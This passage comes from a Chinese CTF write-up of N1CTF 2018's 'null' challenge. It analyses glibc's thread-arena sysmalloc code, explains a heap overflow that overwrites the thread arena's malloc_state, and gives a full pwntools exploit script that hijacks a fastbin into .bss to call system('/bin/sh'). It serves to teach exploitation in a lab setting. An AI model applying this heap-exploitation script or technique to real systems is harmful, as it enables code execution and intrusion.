class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="keyword">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="keyword">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">bool</span> tried_mmap = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">     the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">     allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">     rather than expanding top.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      heap_info *old_heap, *heap;</span><br><span class="line">      <span class="keyword">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First try to extend the current heap. */</span></span><br><span class="line">      old_heap = heap_for_ptr (old_top);</span><br><span class="line">      old_heap_size = old_heap-&gt;size;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">          set_head (old_top, (((<span class="keyword">char</span> *) old_heap + old_heap-&gt;size) - (<span class="keyword">char</span> *) old_top)</span><br><span class="line">                    | PREV_INUSE);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="keyword">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Use a newly allocated heap.  */</span></span><br><span class="line">          heap-&gt;ar_ptr = av;</span><br><span class="line">          heap-&gt;prev = old_heap;</span><br><span class="line">          av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">          arena_mem += heap-&gt;size;</span><br><span class="line">          <span class="comment">/* Set up the new top.  */</span></span><br><span class="line">          top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">          set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">             MALLOC_ALIGNMENT in size. */</span></span><br><span class="line">          <span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">             become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">             up, too, although the chunk is marked in use. */</span></span><br><span class="line">          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">          set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">          <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">              _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_head (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">              set_foot (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">        <span class="comment">/* We can at least try to use to mmap memory.  */</span></span><br><span class="line">        <span class="keyword">goto</span> try_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此，线程堆的初始化、扩展、sub_heap生成全部完成。</p>
<p>​</p>
</li>
</ol>
<h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目逻辑很简单，主函数什么都没有，只开启了一个线程。</p>
<p><img src="/img/n1ctf2018/2-1.png" alt=""></p>
<p>在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。</p>
<p><img src="/img/n1ctf2018/2-3.png" alt=""></p>
<p><img src="/img/n1ctf2018/2-2.png" alt=""></p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。</p>
<p><img src="/img/n1ctf2018/2-4.png" alt=""></p>
<p>该程序不存在地址泄露，并且system的地址也已经给出。</p>
<p>利用方法是利用上述线程堆块分配的知识。</p>
<ol>
<li><p>首先将线程第一次分配的非主分配区填充满</p>
</li>
<li><p>再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。</p>
</li>
<li><p>再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。</p>
</li>
<li><p>选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为’/bin/sh’即可获得shell。</p>
<p><strong>hint：</strong></p>
<ol>
<li><p>一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。</p>
<p>，与第一题的利用相同，都是0x7f。</p>
</li>
<li><p>无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。</p>
</li>
</ol>
<p>​</p>
</li>
</ol>
<h2 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./null'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./null'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter secret password:'</span>)</span><br><span class="line">p.send(<span class="string">'i\'m ready for challenge\n'</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1000</span><span class="number">-1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1000</span><span class="number">-1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1000</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1000</span><span class="number">-1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">90</span><span class="number">-1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+p64(<span class="number">0</span>)*(<span class="number">2</span>+<span class="number">4</span>+<span class="number">2</span>+<span class="number">8</span>+<span class="number">3</span><span class="number">-1</span>))</span><br><span class="line">padding = p64(<span class="number">0</span>)*(<span class="number">0x4000</span>/<span class="number">8</span><span class="number">-2</span><span class="number">-4</span><span class="number">-8</span><span class="number">-3</span>) +p64(<span class="number">0</span>)+ p64(<span class="number">0x11</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x60201d</span>)+ p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#p64(0x602028-4)</span></span><br><span class="line"><span class="keyword">print</span> hex(len(padding))</span><br><span class="line">p.send(padding)</span><br><span class="line"><span class="comment">#gdb.attach(p,'info threads')</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x60</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:'</span>)</span><br><span class="line">p.send(<span class="string">'sh\0'</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x400978</span>)+p64(<span class="number">0</span>)*(<span class="number">0x60</span>/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>​</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol>
<li>打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。</li>
<li>想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验</li>
</ol>
</li>
</ol>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *a ;</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[%d] malloc address %p\n"</span>,num++,a);</span><br><span class="line">	sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> tid[<span class="number">40</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">void</span> * ret;</span><br><span class="line">	<span class="keyword">char</span> *a;</span><br><span class="line">  	num = <span class="number">0</span>;</span><br><span class="line">  	setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"this is a test for thread arena! %d\n"</span>,num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line">		pthread_create(&amp;tid[i],<span class="literal">NULL</span>,thread_func,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] main malloc address %p\n"</span>,a);</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line">		<span class="comment">//pthread_create(&amp;tid[i],NULL,thread_func,NULL);</span></span><br><span class="line">		pthread_join(tid[i],<span class="number">0</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/n1ctf2018/3.png" alt=""></p>

    </article>
    <!-- 前后页  -->
    <ul class="post-pager">
        
            <li class="next">
                <a href= "/2018/03/20/tcache/" title= tcache 源码分析及利用思路 >
                    <span>Next Post</span>
                    <span>tcache 源码分析及利用思路</span>
                </a>
            </li>
        
        
            <li class="previous">
                <a href= "/2018/03/06/hgame/" title= HGAME 2018 PWN题记录 >
                    <span>Previous Post</span>
                    <span>HGAME 2018 PWN题记录</span>
                </a>
            </li>
        
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

    <div id="lv-container" data-id="city" data-uid= MTAyMC8zMzUzOS8xMDA5NQ==>
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>

<!-- City版安装代码已完成 -->
    
    
    <!--PC版-->

    <!--PC版-->


    
    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:p4nda_dubhe@163.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="/github.com/ret2p4nda" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
            
                <a href="https://www.zhihu.com/people/panda_Z/activities" class="iconfont-archer zhihu" target="_blank" title="zhihu"></a>
            
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
        <span id="busuanzi_container_site_pv">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
        </span>
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper">
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vote"><span class="toc-number">1.</span> <span class="toc-text">vote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#地址泄露"><span class="toc-number">1.2.1.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastbin劫持"><span class="toc-number">1.2.2.</span> <span class="toc-text">Fastbin劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题脚本"><span class="toc-number">1.2.3.</span> <span class="toc-text">解题脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">null</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#线程堆块分配"><span class="toc-number">3.</span> <span class="toc-text">线程堆块分配</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#名词解释"><span class="toc-number">3.0.1.</span> <span class="toc-text">名词解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据结构"><span class="toc-number">3.0.2.</span> <span class="toc-text">数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结构组织"><span class="toc-number">3.0.3.</span> <span class="toc-text">结构组织</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题脚本-1"><span class="toc-number">3.3.</span> <span class="toc-text">解题脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他"><span class="toc-number">4.</span> <span class="toc-text">其他</span></a></li></ol>
    </div>
    
    <div class="back-top">&#xe639;</div>
    <div class="sidebar">
    <div class="sidebar-header sidebar-header-show-archive">
        <div class="sidebar-category">
            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
        </div>
    </div>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-archive">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-archive"> Total : 7 </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2018/03/27/QWB2018/" >2018</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2018/03/20/tcache/" >tcache 源码分析及利用思路</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/n1ctf2018/" >N1CTF 2018 && 线程堆知识源代码分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2018/03/06/hgame/" >HGAME 2018 PWN题记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2018/03/03/question/" >问题解决及工具使用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2018/02/05/hitctf/" >HITCTF 2018 PWN 题记录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/23</span><a class="archive-post-title" href= "/2018/01/23/hello-world/" >Hello World</a>
        </li>
    
    </div>
  </div>
        <div class="sidebar-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name"><a href= "#">CTF</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">PWN</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">Linux</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">hello</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">world</a></span>
    
        <span class="sidebar-tag-name"><a href= "#">Questions</a></span>
    
    </div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br/>
    1、请确保node版本大于6.2<br/>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: false
    tags: true</pre>
    </div> 
    <div class="sidebar-tag-list"></div>
</div>
    </div>
</div> 
    <script>
    var jsInfo = {
        root: '/'
    }
</script>
    <!-- 不蒜子  -->
    
    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ统计  -->
    
    </div>
    </body>
</html>


